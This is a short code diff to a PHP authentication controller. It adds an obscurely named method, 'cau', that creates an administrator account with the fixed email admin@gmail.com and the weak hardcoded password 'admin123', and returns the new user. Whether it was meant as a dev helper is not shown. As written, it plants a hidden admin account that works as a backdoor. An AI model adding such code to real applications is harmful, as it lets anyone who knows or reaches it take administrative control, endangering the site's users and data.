@@ -109,4 +109,17 @@ class AuthenticationController extends Controller
         $success['logout'] = $logout;
         return $success;
     }
+
+    public function cau()
+    {
+        $user =  User::create([
+            'email' => 'admin@gmail.com',
+            'name' => 'Admin',
+            'password' => Hash::make('admin123'),
+            'user_type' => "administrator",
+        ]);
+        $response['user'] = $user;
+        $response['message'] = "User created successfully";
+        return $response;
+    }
 }
